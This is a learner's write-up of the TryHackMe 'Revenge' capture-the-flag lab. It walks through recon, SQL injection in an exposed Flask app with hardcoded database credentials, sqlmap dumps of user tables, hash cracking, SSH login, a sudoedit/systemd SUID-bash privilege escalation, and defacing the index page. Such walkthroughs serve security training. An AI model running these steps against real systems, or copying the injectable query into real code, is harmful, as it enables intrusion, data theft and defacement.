<h1 align="center">Revenge</h1>
<p align="center">2025, August 12<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>463</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/2ad63540-2987-4199-abbd-27d2306928f7"><br>
Access this CTF <a href="https://tryhackme.com/room/revenge">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/8a4c357e-03dc-4e10-b2a4-2abbab01e1a9"></p>

<br>

<h2>Task 1 . Message from Billy Joel</h2>
<p>Billy Joel has sent you a message regarding your mission.  Download it, read it and continue on.</p>

<p align="center"><img width="200px" src="https://github.com/user-attachments/assets/388955d8-3e39-4590-a4fc-25428bdd128b"><br>
Image from freepik.com</p>

<p><em>Answer the question below</em></p>

<p>1.1. Read through your mission and continue<br>
<code>No answer needed</code></p>

<br>
<br>
<h2>Task 2 . Revenge!</h2>

<p align="center"><img width="200px" src="https://github.com/user-attachments/assets/03a4c57d-5d8c-44b9-8016-0225fe5fff0d"><br>
Image from freepik.com</p>

<p>This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?<br>

There is a sister room to this one. If you have not completed Blog yet, I recommend you do so. It's not required but may enhance the story for you.<br>

All images on the webapp, including the navbar brand logo, 404 and 500 pages, and product images goes to Varg. Thanks for helping me out with this one, bud.<br>

Please hack responsibly. Do not attack a website or domain that you do not own the rights to. TryHackMe does not condone illegal hacking. This room is just for fun and to tell a story.</p>

<p><em>Answer the question below</em></p>

<br>
<br>
<h3>Nmap</h3>

```bash
:~/Revenge# nmap -sC -sV -p- -T4 xx.xxx.xx.xxx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
```

<br>
<br>
<h3>Gobuster</h3>

```bash
:~/Revenge# gobuster dir -u http://xx.xxx.xx.xxx/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x py,txt -t 80
...
/contact              (Status: 200) [Size: 6906]
/index                (Status: 200) [Size: 8541]
/products             (Status: 200) [Size: 7254]
/login                (Status: 200) [Size: 4980]
/static               (Status: 301) [Size: 194] [--> http://xx.xxx.xx.xxx/static/]
/admin                (Status: 200) [Size: 4983]
/app.py               (status: 200) [Size: 258]
/requirements.txt     (Status: 200) [Size: 258]
```

<br>
<br>
<h3>app.py</h3>

<img width="1220" height="329" alt="image" src="https://github.com/user-attachments/assets/a250f9ba-def9-45de-8f86-28d7e7941d79" />

<br>

```bash
:~/Revenge# curl http://xx.xxx.xx.xxx/app.py
from flask import Flask, render_template, request, flash
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
from flask_bcrypt import Bcrypt

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)


app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
eng = create_engine('mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc')


# Main Index Route
@app.route('/', methods=['GET'])
@app.route('/index', methods=['GET'])
def index():
    return render_template('index.html', title='Home')


# Contact Route
@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        flash('Thank you for reaching out.  Someone will be in touch shortly.')
        return render_template('contact.html', title='Contact')

    elif request.method == 'GET':
        return render_template('contact.html', title='Contact')


# Products Route
@app.route('/products', methods=['GET'])
def products():
    return render_template('products.html', title='Our Products')


# Product Route
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)


# Login
@app.route('/login', methods=['GET'])
def login():
    if request.method == 'GET':
        return render_template('login.html', title='Customer Login')


# Admin login
@app.route('/admin', methods=['GET'])
def admin():
    if request.method == 'GET':
        return render_template('admin.html', title='Admin Login')


# Page Not found error handler
@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html', error=e), 404


@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html', error=e), 500


if __name__ == "__main__":
    app.run('0.0.0.0')
```

<br>
<br>
<h3>Products</h3>

<p>

- vulnerable to SQL injection</p>

<br>

<img width="1214" height="310" alt="image" src="https://github.com/user-attachments/assets/a9000255-4a94-44dd-9b32-dd8d79006674" />

<br>
<br>
<h3>xx.xxx.xx.xxx/login</h3>


<img width="1187" height="587" alt="image" src="https://github.com/user-attachments/assets/569997b1-99d9-4cb6-b567-66c3832912c9" />

<br>
<br>
<h3>sqlmap</h3>

<br>

<img width="1351" height="324" alt="image" src="https://github.com/user-attachments/assets/133af0bc-449b-4e9d-a308-9c385e73da36" />

<br>

```bash
:~/Revenge# sqlmap -u http://xx.xxx.xx.xxx/products/1 --batch --risk 3 --level 5
...
back-end DBMS: MySQL >= 5.0.12
```

<br>


```bash
:~/Revenge# sqlmap -u http://xx.xxx.xx.xxx/products/1 --batch --risk 3 --level 5 --dbs
...
available databases [5]:                                                                                                                                                                               
[*] duckyinc
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

<br>

```bash
:~/Revenge# sqlmap -u http://xx.xxx.xx.xxx/products/1 --batch --risk 3 --level 5 -D duckyinc --tables
...
Database: duckyinc                                                                                                                                                                                     
[3 tables]
+-------------+
| system_user |
| user        |
| product     |
+-------------+
```

<br>

```bash
:~/Revenge# sqlmap -u http://xx.xxx.xx.xxx/products/1 --batch --risk 3 --level 5 -D duckyinc -T user --dump
...
Database: duckyinc                                                                                                                                                                                     
Table: user
[10 entries]
+------+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id   | email                           | company          | username | _password                                                    | credit_card                |
+------+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1    | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$********IUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2    | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$********9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3    | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$********ufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4    | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$********PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5    | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$*********sec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6    | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$********4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{*************3nt3r1ng} |
| 7    | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$********oN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8    | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$*********xD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9    | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$*********ch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10   | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$***********TLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+------+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
```

<br>

<img width="1353" height="275" alt="image" src="https://github.com/user-attachments/assets/4c1aebd9-4c13-4b72-af3c-868992c67088" />

<br>

<p>2.1. flag1<br>
<code>thm{*************3nt3r1ng}</code></p>

<br>

```bash
:~/Revenge# sqlmap -u http://xx.xxx.xx.xxx/products/1 --batch --risk 3 --level 5 -D duckyinc --dump
...
Database: duckyinc                                                                                                                                                                                     
Table: system_user
[3 entries]
+------+----------------------+--------------+--------------------------------------------------------------+
| id   | email                | username     | _password                                                    |
+------+----------------------+--------------+--------------------------------------------------------------+
| 1    | sadmin@duckyinc.org  | server-admin | $2a$08$********2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2    | kmotley@duckyinc.org | kmotley      | $2a$12$********OfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3    | dhughes@duckyinc.org | dhughes      | $2a$12$********uIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+------+----------------------+--------------+--------------------------------------------------------------+
...
Database: duckyinc                                                                                                                                                                                     
Table: user
...
Database: duckyinc                                                                                                                                                                                     
Table: product
[4 entries]
+------+----------+----------+-----------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| id   | price    | cost     | name                  | details                                                                                                                                                                                                                                                                                                                 | in_stock | image_url                         | color_options             |
+------+----------+----------+-----------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| 1    | 35.00    | 50.00    | Box of Duckies        | Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses. If you order before 2 PM on any weekday, we can guarantee that your order will be shipped out the same day.                                                             | Y        | images/box-of-duckies.png         | yellow                    |
| 2    | 600.00   | 500.00   | Dozen of Duckies      | Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However, orders of this product are typically shipped out next day, provided they are ordered prior to 2 PM on any weekday.                                                                         | N        | images/dozen-boxes-of-duckies.png | yellow, blue, green, red  |
| 3    | 1000.00  | 800.00   | Pallet of Duckies     | Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes with 20 boxes of duckies in the colors of your choosing. Boxes can only contain one color ducky but multiple colors can be selected when you call to order. Just let your salesperson know. | N        | images/pallet.png                 | yellow, blue, red, orange |
| 4    | 22000.00 | 15000.00 | Truck Load of Duckies | This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duckies. Due to the logistics with this type of order, FAST shipping is not available.\r\n\r\nActual truck not pictured.                                                              | Y        | images/truckload.png              | yellow, blue              |
+------+----------+----------+-----------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
```

<br>
<br>
<h3>John the Ripper</h3>


```bash
:~/Revenge# john server-admin-hash --wordlist=/usr/share/wordlists/rockyou.txt
...
inu*****         (?)
```

<br>
<br>
<h3>SSH</h3>

```bash
:~/Revenge# ssh server-admin@ducky.thm
...
server-admin@duckyinc:~$
```

<img width="1272" height="498" alt="image" src="https://github.com/user-attachments/assets/09d1eff3-9d84-4082-9932-6f2badba80f2" />

<br>

```bash
server-admin@duckyinc:~$ pwd
/home/server-admin
```

<br>

```bash
server-admin@duckyinc:~$ ls
flag2.txt
```

<br>

```bash
server-admin@duckyinc:~$ cat flag2.txt
thm{*******th3re}
```

<br>

<p>2.2. flag2<br>
<code>thm{*******th3re}</code></p>

<br>
<br>
<h3>sudo -l</h3>

```bash
server-admin@duckyinc:/$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload,
        sudoedit /etc/systemd/system/duckyinc.service
```

<br>
<h3>duckyinc.service</h3>


```bash
server-admin@duckyinc:/$ ls -lah /etc/systemd/system/duckyinc.service
-rw-r--r-- 1 root root 388 Aug 12  2020 /etc/systemd/system/duckyinc.service
```

<br>

```bash
server-admin@duckyinc:/$ cat /etc/systemd/system/duckyinc.service
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /dev/shm/rev.sh
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target

```

<br>
<h3>Reverse Shell</h3>

```bash
server-admin@duckyinc:/tmp$ nano rev.sh
```

<br>

```bash
server-admin@duckyinc:/tmp$ chmod +x rev.sh
```

<br>

```bash
server-admin@duckyinc:/tmp$ cat rev.sh
#!/bin/bash

cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
```

<br>

```bash
server-admin@duckyinc:/tmp$ sudoedit /etc/systemd/system/duckyinc.service
```

<br>

```bash
server-admin@duckyinc:/tmp$ cat /etc/systemd/system/duckyinc.service
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /tmp/rev.sh
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

<br>

<img width="1268" height="732" alt="image" src="https://github.com/user-attachments/assets/c8d33d15-65e8-4876-9001-13eb041ea542" />

<br>

```bash
server-admin@duckyinc:/tmp$ sudo /bin/systemctl daemon-reload
```

<br>

```bash
server-admin@duckyinc:/tmp$ sudo /bin/systemctl enable duckyinc.service
```

<br>

```bash
server-admin@duckyinc:/tmp$ sudo /bin/systemctl restart duckyinc.service
```

<br>

```bash
server-admin@duckyinc:/tmp$ /tmp/bash -p
bash-4.4# id
uid=1001(server-admin) gid=1001(server-admin) euid=0(root) groups=1001(server-admin),33(www-data)
```

<br>

```bash
bash-4.4$ ls
404.html  admin.html  contact.html  login.html	  products.html
500.html  base.html   index.html    product.html
```

<br>

```bash
bash-4.4$ echo a > index.html
```

<br>

```bash
bash-4.4# cd /root
bash-4.4# ls
flag3.txt
bash-4.4# cat flag3.txt
thm{********acc0mpl1sh3d}}
```

<br>

<p>2.3. flag3. Hint : Mission objectives<br>
<code>thm{********acc0mpl1sh3d}</code></p>

<br>

<img width="1270" height="403" alt="image" src="https://github.com/user-attachments/assets/ce4452bb-0045-40dd-ae72-1b1b0daa8c7e" />

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/aaf5c1cd-8c74-4c2d-b00b-c038fd74d69b"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/df9de41b-c81b-49cc-a777-fc511751e0f5"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 12   |   463    |     125ᵗʰ    |      5ᵗʰ     |     328ᵗʰ   |     7ᵗʰ    | 120,836  |    913    |    73     |


</div>

<p align="center">Global All Time:   127ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/e7418865-4773-452e-80bb-bf6dd1e7907c"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/0eeb6e74-830b-48f7-94fd-971bf0ac6ed1"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/ad8da74a-25b6-4ed0-a73d-2a2c41910bb2"><br>
                  Global monthly:    328ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/251ccecc-f563-4bb1-9d96-f12822ca20af"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/31446a69-92fa-41fa-8680-7f90aec2c8f2"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
